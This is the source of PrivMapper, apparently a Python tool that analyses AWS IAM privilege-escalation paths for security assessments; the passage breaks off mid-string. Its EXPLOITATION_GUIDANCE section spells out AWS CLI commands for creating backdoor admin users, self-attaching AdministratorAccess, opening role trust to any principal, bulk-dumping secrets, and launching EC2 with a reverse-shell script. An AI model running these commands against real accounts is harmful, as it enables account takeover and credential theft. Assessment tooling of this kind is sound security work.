#!/usr/bin/env python3
"""
PrivMapper - AWS IAM privilege-escalation analysis and reporting.

Single-file tool. Reads a PMapper graph (or runs PMapper), performs AWS-faithful IAM
analysis, and produces an interactive HTML report plus JSON/CSV for security assessments.

Usage:
    python privmapper.py --input /path/to/pmapper/graph --output ./report
    python privmapper.py --input ./graph --query "who can do iam:PassRole"
    python privmapper.py --profile prod --create-graph --format html,json,csv

Analysing an existing graph needs only the Python standard library. Live collection
(--profile) additionally requires `pip install principalmapper` and a configured AWS CLI.

Built on PMapper (Principal Mapper) by NCC Group and the original PrivMapper by
Shubham Dubey. MIT licensed.
"""

__version__ = "2.0.0"

import argparse
import csv
import json
import os
import re
import shutil
import subprocess
import sys
import time
from collections import defaultdict
from dataclasses import asdict, dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple


@dataclass
class PolicyStatement:
    effect: str
    actions: List[str]
    resources: List[str]
    conditions: Dict[str, Any] = field(default_factory=dict)
    principals: List[str] = field(default_factory=list)
    not_actions: List[str] = field(default_factory=list)
    not_resources: List[str] = field(default_factory=list)
    sid: str = ""


@dataclass
class Policy:
    arn: str
    name: str
    statements: List[PolicyStatement] = field(default_factory=list)
    is_aws_managed: bool = False


@dataclass
class Principal:
    arn: str
    name: str
    principal_type: str
    account_id: str
    policies: List[str] = field(default_factory=list)
    inline_policies: List[Policy] = field(default_factory=list)
    trust_policy: Optional[Dict] = None
    is_admin: bool = False
    has_access_keys: bool = False
    num_access_keys: int = 0
    is_instance_profile: bool = False
    group_memberships: List[str] = field(default_factory=list)
    group_policy_arns: List[str] = field(default_factory=list)
    tags: Dict[str, str] = field(default_factory=dict)
    has_mfa: bool = False
    active_password: bool = False
    id_value: str = ""
    permissions_boundary: Optional[str] = None
    dangerous_actions: Set[str] = field(default_factory=set)
    capabilities: List[str] = field(default_factory=list)
    capability_groups: List[Tuple[str, str, List[str]]] = field(default_factory=list)
    action_evidence: Dict[str, Any] = field(default_factory=dict)
    has_notaction: bool = False
    boundary_capped: bool = False
    unresolved_managed: List[str] = field(default_factory=list)


@dataclass
class Edge:
    source: str
    target: str
    reason: str
    short_reason: str = ""


@dataclass
class EscalationPath:
    source: Principal
    target: Principal
    hops: List[Edge]
    technique: str
    risk_score: int = 0
    severity: str = "medium"
    complexity: int = 1
    exposure: int = 5
    blast_radius: int = 5
    mitre_techniques: List[Dict] = field(default_factory=list)
    attack_narrative: str = ""


@dataclass
class CrossAccountTrust:
    role_arn: str
    role_name: str
    trusted_principal: str
    trusted_account: str
    has_external_id: bool
    has_conditions: bool
    is_wildcard: bool
    risk_level: str
    principal_kind: str = "AWS"
    external_id_enforced: bool = False
    target_is_admin: bool = False
    reason: str = ""
    remediation_key: str = ""


@dataclass
class Finding:
    id: str
    title: str
    severity: str
    category: str
    description: str
    principals: List[str]
    impact: str
    remediation: str
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AccountAnalysis:
    account_id: str
    account_alias: str
    node_count: int
    edge_count: int
    admin_count: int
    principals: Dict[str, Principal]
    edges: List[Edge]
    policies: Dict[str, Policy]
    findings: List[Finding] = field(default_factory=list)
    escalation_paths: List[EscalationPath] = field(default_factory=list)
    cross_account_trusts: List[CrossAccountTrust] = field(default_factory=list)
    shadow_admins: List[Principal] = field(default_factory=list)
    overly_permissive: List[Principal] = field(default_factory=list)
    aws_managed_admins: List[Principal] = field(default_factory=list)
    credential_hygiene: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class RunMetadata:
    """Metadata about the analysis run for display in report."""
    profiles: List[str] = field(default_factory=list)
    input_paths: List[str] = field(default_factory=list)
    regions_used: List[str] = field(default_factory=list)
    regions_excluded: List[str] = field(default_factory=list)
    auto_detected_regions: bool = False
    run_timestamp: str = ""
    tool_version: str = "1.0.0"
    pmapper_version: str = ""
    output_directory: str = ""
    output_formats: List[str] = field(default_factory=list)


AWS_MANAGED_PATTERNS = [
    r"OrganizationAccountAccessRole", r"AWSReservedSSO_", r"AWSServiceRoleFor",
    r"aws-reserved", r"AWSControlTower", r"aws-controltower",
    r"stacksets-exec-", r"StackSet-", r"AWSBackup", r"AWSConfig",
    r"AWSServiceRole", r"AmazonSSM", r"CloudFormation",
]


DANGEROUS_ACTIONS = {
    "iam:CreateUser", "iam:CreateAccessKey", "iam:DeleteAccessKey",
    "iam:CreateLoginProfile", "iam:UpdateLoginProfile",
    "iam:AttachUserPolicy", "iam:AttachRolePolicy", "iam:AttachGroupPolicy",
    "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:PutGroupPolicy",
    "iam:SetDefaultPolicyVersion", "iam:PassRole", "iam:UpdateAssumeRolePolicy",
    "iam:CreatePolicyVersion", "iam:AddUserToGroup",
    "iam:CreateInstanceProfile", "iam:AddRoleToInstanceProfile",
    "iam:CreateServiceLinkedRole",
    "sts:AssumeRole", "sts:AssumeRoleWithSAML", "sts:AssumeRoleWithWebIdentity",
    "secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters",
    "ssm:GetParametersByPath", "ssm:SendCommand", "ssm:StartSession",
    "s3:GetObject", "s3:PutBucketPolicy", "s3:PutObject",
    "ec2:RunInstances", "ec2:AssociateIamInstanceProfile",
    "lambda:CreateFunction", "lambda:UpdateFunctionCode",
    "lambda:UpdateFunctionConfiguration", "lambda:AddPermission", "lambda:InvokeFunction",
    "glue:CreateJob", "glue:UpdateJob",
    "cloudformation:CreateStack", "cloudformation:UpdateStack",
    "cloudformation:CreateChangeSet", "cloudformation:ExecuteChangeSet",
    "codebuild:CreateProject", "codebuild:UpdateProject",
    "codebuild:StartBuild", "codebuild:StartBuildBatch",
    "sagemaker:CreateNotebookInstance", "sagemaker:CreateTrainingJob",
    "sagemaker:CreateProcessingJob",
    "autoscaling:CreateAutoScalingGroup", "autoscaling:CreateLaunchConfiguration",
    "autoscaling:UpdateAutoScalingGroup",
    "ecs:RunTask", "ecs:RegisterTaskDefinition",
    "states:CreateStateMachine", "datapipeline:CreatePipeline",
    "cloudtrail:StopLogging", "cloudtrail:DeleteTrail",
    "guardduty:DeleteDetector", "config:StopConfigurationRecorder",
}


ADMIN_ACTIONS = {"*", "iam:*"}


CONFUSED_DEPUTY_SERVICES = {
    "cloudtrail", "sns", "sqs", "s3", "config", "events", "eventbridge",
    "access-analyzer", "backup", "apigateway", "cognito-identity", "cognito-idp",
    "secretsmanager", "logs", "cloudwatch", "kms", "ses", "elasticloadbalancing",
    "servicecatalog", "resource-explorer-2", "scheduler", "pipes",
}


TECHNIQUE_PATTERNS = {
    "Direct STS AssumeRole": [r"sts:AssumeRole", r"can assume role"],
    "Cross-Account AssumeRole": [r"cross.?account", r"external account"],
    "Access Key Creation": [r"CreateAccessKey", r"create access key"],
    "Login Profile": [r"CreateLoginProfile", r"UpdateLoginProfile", r"password"],
    "Trust Policy Modification": [r"UpdateAssumeRolePolicy", r"trust.*policy", r"trust document"],
    "Policy Attachment": [r"Attach.*Policy", r"Put.*Policy", r"attach.*administrator"],
    "Policy Version": [r"CreatePolicyVersion", r"SetDefaultPolicyVersion"],
    "Lambda CreateFunction": [r"lambda:CreateFunction", r"create.*function.*role"],
    "Lambda UpdateFunctionCode": [r"lambda:UpdateFunctionCode", r"update.*function.*code"],
    "Lambda Configuration": [r"lambda:UpdateFunctionConfiguration"],
    "EC2 Instance Profile": [r"ec2:RunInstances.*PassRole", r"instance.*profile", r"ec2.*role"],
    "EC2 AssociateProfile": [r"AssociateIamInstanceProfile"],
    "EC2 Instance Profile Creation": [r"CreateInstanceProfile", r"AddRoleToInstanceProfile"],
    "CodeBuild CreateProject": [r"codebuild:CreateProject"],
    "CodeBuild UpdateProject": [r"codebuild:UpdateProject"],
    "CodeBuild StartBuild": [r"codebuild:StartBuild", r"StartBuildBatch"],
    "CloudFormation CreateStack": [r"cloudformation:CreateStack"],
    "CloudFormation UpdateStack": [r"cloudformation:UpdateStack"],
    "CloudFormation ChangeSet": [r"CreateChangeSet", r"ExecuteChangeSet"],
    "SSM SendCommand": [r"ssm:SendCommand", r"run command"],
    "SSM StartSession": [r"ssm:StartSession", r"interactive session"],
    "SSM/Secrets Access": [r"ssm:GetParameter", r"secretsmanager:GetSecretValue"],
    "SageMaker Notebook": [r"CreateNotebookInstance"],
    "SageMaker Training": [r"CreateTrainingJob"],
    "SageMaker Processing": [r"CreateProcessingJob"],
    "AutoScaling Group": [r"autoscaling:CreateAutoScalingGroup"],
    "AutoScaling LaunchConfig": [r"CreateLaunchConfiguration"],
    "Glue Job Abuse": [r"glue:CreateJob", r"glue:UpdateJob"],
    "ECS Task": [r"ecs:RunTask", r"RegisterTaskDefinition"],
    "Step Functions": [r"states:CreateStateMachine"],
    "Data Pipeline": [r"datapipeline:CreatePipeline"],
}


CATEGORY_WEIGHTS = {
    "iam": 10,
    "sts": 9,
    "compute": 8,
    "credentials": 7,
    "s3": 6,
    "evasion": 5,
}


IAM_CHECKS = {
    "iam:CreateUser", "iam:CreateAccessKey", "iam:CreateLoginProfile",
    "iam:AttachUserPolicy", "iam:AttachRolePolicy", "iam:AttachGroupPolicy",
    "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:PutGroupPolicy",
    "iam:SetDefaultPolicyVersion", "iam:PassRole", "iam:UpdateAssumeRolePolicy",
    "iam:CreatePolicyVersion", "iam:AddUserToGroup", "sts:AssumeRole",
}


S3_CHECKS = {"s3:GetObject", "s3:PutBucketPolicy", "s3:PutObject", "s3:DeleteObject"}


CRED_CHECKS = {"secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters", "ssm:GetParametersByPath"}


EVASION_CHECKS = {"cloudtrail:StopLogging", "cloudtrail:DeleteTrail", "guardduty:DeleteDetector", "config:StopConfigurationRecorder"}


COMPUTE_CHECKS = {
    "ec2:RunInstances", "lambda:CreateFunction", "lambda:UpdateFunctionCode",
    "lambda:AddPermission", "glue:CreateJob", "glue:UpdateJob",
    "cloudformation:CreateStack", "cloudformation:UpdateStack",
    "codebuild:CreateProject", "codebuild:StartBuild",
    "sagemaker:CreateNotebookInstance", "sagemaker:CreateTrainingJob",
    "ecs:RunTask", "ecs:RegisterTaskDefinition",
    "states:CreateStateMachine", "datapipeline:CreatePipeline",
}


IAM_WILDCARD_THRESHOLD = 6


CHECK_LABEL = {
    "iam:CreateUser":               "Create new IAM users (persistent backdoor accounts)",
    "iam:CreateAccessKey":          "Generate long-term access keys for any IAM user",
    "iam:CreateLoginProfile":       "Set a console password for any IAM user",
    "iam:AttachUserPolicy":         "Attach AdministratorAccess to any IAM user",
    "iam:AttachRolePolicy":         "Attach AdministratorAccess to any IAM role",
    "iam:AttachGroupPolicy":        "Attach AdministratorAccess to any IAM group",
    "iam:PutUserPolicy":            "Write allow-all inline policies to any IAM user",
    "iam:PutRolePolicy":            "Write allow-all inline policies to any IAM role",
    "iam:PutGroupPolicy":           "Write allow-all inline policies to any IAM group",
    "iam:SetDefaultPolicyVersion":  "Revert managed policies to older permissive versions",
    "iam:PassRole":                 "Pass privileged roles to EC2, Lambda, ECS, or other services",
    "iam:UpdateAssumeRolePolicy":   "Rewrite role trust policies to grant themselves access",
    "iam:CreatePolicyVersion":      "Create new policy versions with elevated permissions",
    "iam:AddUserToGroup":           "Add users to privileged groups",
    "sts:AssumeRole":               "Assume other IAM roles and inherit their full permissions",
    "secretsmanager:GetSecretValue":"Retrieve all Secrets Manager secrets in plaintext",
    "ssm:GetParameter":             "Read SSM Parameter Store values including encrypted secrets",
    "ssm:GetParameters":            "Bulk retrieve all SSM Parameter Store values at once",
    "ssm:GetParametersByPath":      "Retrieve all parameters under a path hierarchy",
    "s3:GetObject":                 "Download any object from S3 buckets",
    "s3:PutBucketPolicy":           "Rewrite S3 bucket policies to expose buckets publicly",
    "s3:PutObject":                 "Upload/overwrite any object in S3 buckets",
    "s3:DeleteObject":              "Delete any object from S3 buckets",
    "ec2:RunInstances":             "Launch EC2 instances with privileged instance profiles",
    "lambda:UpdateFunctionCode":    "Replace Lambda function code to abuse the execution role",
    "lambda:AddPermission":         "Grant external accounts access to Lambda functions",
    "lambda:CreateFunction":        "Create new Lambda functions with a privileged execution role",
    "glue:CreateJob":               "Create Glue ETL jobs running with a privileged role",
    "glue:UpdateJob":               "Modify existing Glue jobs to run with a privileged role",
    "cloudformation:CreateStack":   "Deploy CloudFormation stacks under a privileged role",
    "cloudformation:UpdateStack":   "Update CloudFormation stacks to change resource permissions",
    "codebuild:CreateProject":      "Create CodeBuild projects with a privileged role",
    "codebuild:StartBuild":         "Trigger CodeBuild builds that execute with a privileged role",
    "sagemaker:CreateTrainingJob":  "Create SageMaker training jobs with a privileged execution role",
    "sagemaker:CreateNotebookInstance": "Create SageMaker notebook instances with a privileged role",
    "ecs:RunTask":                  "Run ECS tasks with a privileged task role",
    "ecs:RegisterTaskDefinition":   "Register ECS task definitions that assign privileged task roles",
    "states:CreateStateMachine":    "Create Step Functions state machines with a privileged role",
    "datapipeline:CreatePipeline":  "Create Data Pipelines running with a privileged role",
    "cloudtrail:StopLogging":       "Stop CloudTrail logging (removes audit trail)",
    "cloudtrail:DeleteTrail":       "Delete CloudTrail trails permanently",
    "guardduty:DeleteDetector":     "Delete GuardDuty detectors (disables threat detection)",
    "config:StopConfigurationRecorder": "Stop AWS Config recording (hides configuration changes)",
}


MITRE_MAPPINGS = {
    "iam:CreateUser":               {"tactic": "Persistence", "technique": "T1136.003", "name": "Create Cloud Account"},
    "iam:CreateAccessKey":          {"tactic": "Persistence", "technique": "T1098.001", "name": "Additional Cloud Credentials"},
    "iam:CreateLoginProfile":       {"tactic": "Persistence", "technique": "T1098.001", "name": "Additional Cloud Credentials"},
    "iam:AttachUserPolicy":         {"tactic": "Privilege Escalation", "technique": "T1484.002", "name": "Domain Trust Modification"},
    "iam:AttachRolePolicy":         {"tactic": "Privilege Escalation", "technique": "T1484.002", "name": "Domain Trust Modification"},
    "iam:AttachGroupPolicy":        {"tactic": "Privilege Escalation", "technique": "T1484.002", "name": "Domain Trust Modification"},
    "iam:PutUserPolicy":            {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "iam:PutRolePolicy":            {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "iam:PutGroupPolicy":           {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "iam:PassRole":                 {"tactic": "Privilege Escalation", "technique": "T1548", "name": "Abuse Elevation Control"},
    "iam:UpdateAssumeRolePolicy":   {"tactic": "Privilege Escalation", "technique": "T1098", "name": "Account Manipulation"},
    "sts:AssumeRole":               {"tactic": "Privilege Escalation", "technique": "T1550.001", "name": "Application Access Token"},

    "secretsmanager:GetSecretValue": {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},
    "ssm:GetParameter":              {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},
    "ssm:GetParameters":             {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},
    "ssm:GetParametersByPath":       {"tactic": "Credential Access", "technique": "T1552.005", "name": "Cloud Instance Metadata API"},

    "lambda:CreateFunction":        {"tactic": "Execution", "technique": "T1648", "name": "Serverless Execution"},
    "lambda:UpdateFunctionCode":    {"tactic": "Execution", "technique": "T1648", "name": "Serverless Execution"},
    "ec2:RunInstances":             {"tactic": "Execution", "technique": "T1204.003", "name": "Malicious Image"},
    "codebuild:CreateProject":      {"tactic": "Execution", "technique": "T1072", "name": "Software Deployment Tools"},
    "codebuild:StartBuild":         {"tactic": "Execution", "technique": "T1072", "name": "Software Deployment Tools"},
    "glue:CreateJob":               {"tactic": "Execution", "technique": "T1648", "name": "Serverless Execution"},
    "cloudformation:CreateStack":   {"tactic": "Execution", "technique": "T1072", "name": "Software Deployment Tools"},
    "sagemaker:CreateNotebookInstance": {"tactic": "Execution", "technique": "T1204.003", "name": "Malicious Image"},
    "ecs:RunTask":                  {"tactic": "Execution", "technique": "T1610", "name": "Deploy Container"},

    "cloudtrail:StopLogging":       {"tactic": "Defense Evasion", "technique": "T1562.008", "name": "Disable Cloud Logs"},
    "cloudtrail:DeleteTrail":       {"tactic": "Defense Evasion", "technique": "T1562.008", "name": "Disable Cloud Logs"},
    "guardduty:DeleteDetector":     {"tactic": "Defense Evasion", "technique": "T1562.001", "name": "Disable or Modify Tools"},
    "config:StopConfigurationRecorder": {"tactic": "Defense Evasion", "technique": "T1562.001", "name": "Disable or Modify Tools"},

    "s3:GetObject":                 {"tactic": "Collection", "technique": "T1530", "name": "Data from Cloud Storage"},
    "s3:PutBucketPolicy":           {"tactic": "Exfiltration", "technique": "T1537", "name": "Transfer Data to Cloud Account"},
}


def get_mitre_for_action(action: str) -> Optional[Dict]:
    """Get MITRE ATT&CK mapping for an action."""
    return MITRE_MAPPINGS.get(action)


def get_mitre_for_technique(technique: str) -> List[Dict]:
    """Get MITRE ATT&CK mappings for a technique category."""
    mappings = []
    technique_lower = technique.lower()

    if "lambda" in technique_lower or "serverless" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("lambda:CreateFunction", {}))
    elif "codebuild" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("codebuild:CreateProject", {}))
    elif "ec2" in technique_lower or "instance" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("ec2:RunInstances", {}))
    elif "assume" in technique_lower or "sts" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("sts:AssumeRole", {}))
    elif "policy" in technique_lower or "attach" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("iam:AttachRolePolicy", {}))
    elif "access key" in technique_lower or "createaccesskey" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("iam:CreateAccessKey", {}))
    elif "secret" in technique_lower or "ssm" in technique_lower:
        mappings.append(MITRE_MAPPINGS.get("secretsmanager:GetSecretValue", {}))

    return [m for m in mappings if m]


EXPLOITATION_GUIDANCE = {
    "admin_access": {
        "title": "Administrative Access",
        "risk_rating": "Critical",
        "cvss_estimate": "9.8 (Critical)",
        "description": "Principals with AdministratorAccess policy have unrestricted access to all AWS services and resources in the account.",
        "impact": {
            "confidentiality": "Complete data exfiltration capability across all services (S3, RDS, DynamoDB, Secrets Manager, etc.)",
            "integrity": "Full ability to modify any resource configuration, deploy backdoors, tamper with logs",
            "availability": "Can delete any resource, stop services, or cause denial of service",
            "business": "Full account compromise, potential regulatory violations, data breach liability",
        },
        "exploitation_steps": [
            "1. Obtain credentials for the admin principal (access keys, session tokens, or console access)",
            "2. Verify admin access: aws sts get-caller-identity && aws iam list-attached-user-policies --user-name <NAME>",
            "3. Enumerate sensitive data: aws s3 ls --recursive | grep -i secret",
            "4. Extract secrets: aws secretsmanager list-secrets && aws secretsmanager get-secret-value --secret-id <ID>",
            "5. Create backdoor access: aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        ],
        "aws_cli_commands": '''# Verify admin access
aws sts get-caller-identity
aws iam simulate-principal-policy --policy-source-arn <ARN> --action-names "*" --resource-arns "*"

# Exfiltrate secrets
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Create persistence
aws iam create-access-key --user-name <ADMIN_USER>
aws iam create-user --user-name attacker-backdoor
aws iam attach-user-policy --user-name attacker-backdoor \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess''',
        "evidence": "Look for attached policy: arn:aws:iam::aws:policy/AdministratorAccess",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html",
            "https://attack.mitre.org/techniques/T1078/004/",
        ],
    },
    "shadow_admin": {
        "title": "Shadow Administrator",
        "risk_rating": "Critical",
        "cvss_estimate": "9.1 (Critical)",
        "description": "Principals that can escalate to admin privileges through IAM permission manipulation, without having AdministratorAccess attached.",
        "impact": {
            "confidentiality": "After escalation, full data access capability",
            "integrity": "Can modify any IAM policy to grant themselves or others elevated access",
            "availability": "Can deny access to legitimate administrators by modifying policies",
            "business": "Hidden privilege escalation path that evades standard IAM audits",
        },
        "exploitation_steps": [
            "1. Identify the escalation vector (iam:AttachRolePolicy, iam:PutUserPolicy, etc.)",
            "2. Escalate privileges: aws iam attach-user-policy --user-name <SELF> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "3. Alternatively create a new policy version: aws iam create-policy-version --policy-arn <ARN> --policy-document file://admin-policy.json --set-as-default",
            "4. Or modify role trust: aws iam update-assume-role-policy --role-name <ADMIN_ROLE> --policy-document file://trust-self.json",
            "5. Assume escalated role or use new permissions",
        ],
        "aws_cli_commands": '''# Method 1: Attach admin policy to self
aws iam attach-user-policy --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2) \\
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Method 2: Create permissive policy version
cat > /tmp/admin.json << 'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file:///tmp/admin.json --set-as-default

# Method 3: Add self to admin role trust
aws iam update-assume-role-policy --role-name AdminRole --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}'

# Method 4: Create access keys for admin user
aws iam create-access-key --user-name admin-user''',
        "evidence": "Check for actions: iam:AttachRolePolicy, iam:AttachUserPolicy, iam:PutRolePolicy, iam:PutUserPolicy, iam:CreatePolicyVersion, iam:UpdateAssumeRolePolicy, iam:CreateAccessKey with Resource:*",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html",
            "https://attack.mitre.org/techniques/T1098/",
        ],
    },
    "privesc": {
        "title": "Privilege Escalation Path",
        "risk_rating": "Critical/High",
        "cvss_estimate": "8.8 (High) to 9.8 (Critical)",
        "description": "Non-admin principals can escalate to administrative access through one or more steps involving role assumption, service abuse, or credential harvesting.",
        "impact": {
            "confidentiality": "Eventual full data access after completing escalation chain",
            "integrity": "Can modify resources and create backdoors once escalated",
            "availability": "Post-escalation can deny service to legitimate users",
            "business": "Attacker with limited access can achieve full account takeover",
        },
        "exploitation_steps": [
            "1. Identify the escalation path and required permissions at each hop",
            "2. Execute the first hop (e.g., assume role, create Lambda, launch EC2)",
            "3. Continue through each hop until reaching the admin target",
            "4. Common patterns: iam:PassRole + service abuse, sts:AssumeRole chain, credential harvesting",
        ],
        "aws_cli_commands": '''# STS AssumeRole escalation
aws sts assume-role --role-arn <TARGET_ROLE_ARN> --role-session-name escalation

# Lambda function abuse (PassRole + CreateFunction)
aws lambda create-function --function-name escalate \\
    --runtime python3.9 --role <PRIVILEGED_ROLE_ARN> \\
    --handler index.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name escalate output.txt

# EC2 instance profile abuse
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \\
    --iam-instance-profile Name=<PRIVILEGED_PROFILE> --user-data file://rev-shell.sh

# CodeBuild project abuse
aws codebuild create-project --name escalate --service-role <PRIVILEGED_ROLE_ARN> \\
    --source type=NO_SOURCE --artifacts type=NO_ARTIFACTS \\
    --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL
aws codebuild start-build --project-name escalate''',
        "evidence": "Look for privilege escalation edges in the graph showing paths from user/role to admin",
        "references": [
            "https://github.com/nccgroup/PMapper",
            "https://attack.mitre.org/tactics/TA0004/",
        ],
    },
    "cross_account_trust": {
        "title": "Risky Cross-Account Trust",
        "risk_rating": "Critical/High",
        "cvss_estimate": "8.1 (High) - 9.8 (Critical for wildcards)",
        "description": "Role trust policies allow external accounts to assume roles without adequate controls (missing ExternalId or wildcard Principal).",
        "impact": {
            "confidentiality": "External accounts can access resources via the trusted role",
            "integrity": "If the role has write permissions, external accounts can modify resources",
            "availability": "Compromised external account could abuse access for DoS",
            "business": "Confused deputy attacks, unauthorized access from untrusted third parties",
        },
        "exploitation_steps": [
            "1. For wildcard trust (Principal: '*'): Any AWS account can assume the role",
            "2. Create an AWS account or use existing one, assume the target role",
            "3. For trusts without ExternalId: If you control/compromise the trusted account, assume directly",
            "4. After assumption, operate with the role's permissions",
        ],
        "aws_cli_commands": '''# Assume a role with wildcard trust from ANY AWS account
aws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<WILDCARD_ROLE> \\
    --role-session-name attacker-session

# From a trusted account without ExternalId protection
aws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<TRUSTED_ROLE> \\
    --role-session-name legitimate-looking

# After assuming, verify access
aws sts get-caller-identity
aws s3 ls  # Test data access''',
        "evidence": "Check role trust policy for Principal: '*' or missing sts:ExternalId condition",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_common-scenarios_third-party.html",
            "https://attack.mitre.org/techniques/T1199/",
        ],
    },
    "overly_permissive": {
        "title": "Overly Permissive Permissions",
        "risk_rating": "High",
        "cvss_estimate": "7.5 (High)",
        "description": "Principals have permissions significantly broader than required for their function, increasing the blast radius of a credential compromise.",
        "impact": {
            "confidentiality": "Broader access than necessary increases exposure of sensitive data",
            "integrity": "More modification capabilities than job function requires",
            "availability": "Could accidentally or maliciously disrupt services",
            "business": "Violates least-privilege principle, increases incident impact",
        },
        "exploitation_steps": [
            "1. Identify the specific dangerous permissions granted (see capability list)",
            "2. Exploit the most impactful permissions based on your objectives",
            "3. Common high-impact actions: s3:GetObject (data exfil), secretsmanager:GetSecretValue (creds), lambda:InvokeFunction (code exec)",
        ],
        "aws_cli_commands": '''# Enumerate what you can do
aws iam simulate-principal-policy --policy-source-arn <ARN> \\
    --action-names "s3:*" "iam:*" "secretsmanager:*" --resource-arns "*"

# Use IAM Access Analyzer to validate policies
aws accessanalyzer validate-policy --policy-type IDENTITY_POLICY \\
    --policy-document file://policy.json

# Check last accessed information for unused permissions
aws iam generate-service-last-accessed-details --arn <PRINCIPAL_ARN>
aws iam get-service-last-accessed-details --job-id <JOB_ID>

# Data exfiltration via S3
aws s3 sync s3://<BUCKET>/ ./exfil/ --exclude "*" --include "*.pem" --include "*.key" --include "*secret*"

# Credential harvesting
aws secretsmanager get-secret-value --secret-id <SECRET_ID>
aws ssm get-parameter --name <PARAM_NAME> --with-decryption''',
        "evidence": "Review the capability groups and specific actions listed for each principal",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-policy-validation.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_last-accessed.html",
            "https://attack.mitre.org/techniques/T1530/",
        ],
    },
    "secrets_access": {
        "title": "Secrets/Credentials Access",
        "risk_rating": "High",
        "cvss_estimate": "8.0 (High)",
        "description": "Principals can read secrets from AWS Secrets Manager or SSM Parameter Store, potentially exposing database credentials, API keys, and other sensitive data.",
        "impact": {
            "confidentiality": "Direct access to stored credentials enables lateral movement",
            "integrity": "Stolen credentials may allow modification of external systems",
            "availability": "Attackers with credentials could lock out legitimate access",
            "business": "Credential theft enables access to databases, third-party services, and other systems",
        },
        "exploitation_steps": [
            "1. List available secrets: aws secretsmanager list-secrets",
            "2. Retrieve secret values: aws secretsmanager get-secret-value --secret-id <NAME>",
            "3. List SSM parameters: aws ssm describe-parameters",
            "4. Get parameter values: aws ssm get-parameter --name <NAME> --with-decryption",
            "5. Use harvested credentials for lateral movement",
        ],
        "aws_cli_commands": '''# Enumerate and exfiltrate Secrets Manager
aws secretsmanager list-secrets --query 'SecretList[*].[Name,ARN]' --output table
aws secretsmanager get-secret-value --secret-id <SECRET_NAME>

# Enumerate and exfiltrate SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Bulk extraction
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
    echo "=== $secret ===" >> secrets.txt
    aws secretsmanager get-secret-value --secret-id $secret --query SecretString --output text >> secrets.txt 2>/dev/null
done''',
        "evidence": "Actions: secretsmanager:GetSecretValue, ssm:GetParameter, ssm:GetParameters, ssm:GetParametersByPath",
        "references": [
            "https://attack.mitre.org/techniques/T1552/005/",
        ],
    },
    "credential_hygiene": {
        "title": "IAM Credential Hygiene",
        "risk_rating": "High/Medium",
        "cvss_estimate": "6.5 (Medium) - 8.1 (High for privileged no-MFA)",
        "description": "IAM users with weak credential hygiene: console access without MFA, and/or long-lived access keys. These increase the likelihood and impact of credential compromise (phishing, key leakage in code/CI, credential stuffing).",
        "impact": {
            "confidentiality": "A phished password (no MFA) or a leaked long-term key grants the user's full permission set to an attacker",
            "integrity": "Compromised credentials allow modification of any resource the user can reach",
            "availability": "Attacker can lock out or disrupt using the compromised identity",
            "business": "MFA absence on privileged users and unrotated static keys are the most common root cause of real cloud breaches and are flagged by CIS AWS Foundations benchmarks",
        },
        "exploitation_steps": [
            "1. Obtain the user's console password (phishing/reuse) - no MFA means the password alone grants access",
            "2. Or obtain a leaked long-term access key (source code, CI logs, laptop) - keys never expire until rotated",
            "3. Authenticate and operate with the user's full permissions",
        ],
        "aws_cli_commands": '''# Identify users without MFA (validation)
aws iam list-users --query 'Users[*].UserName' --output text | \\
  while read u; do n=$(aws iam list-mfa-devices --user-name "$u" --query 'length(MFADevices)'); \\
  echo "$u MFA=$n"; done

# Access-key age (validation)
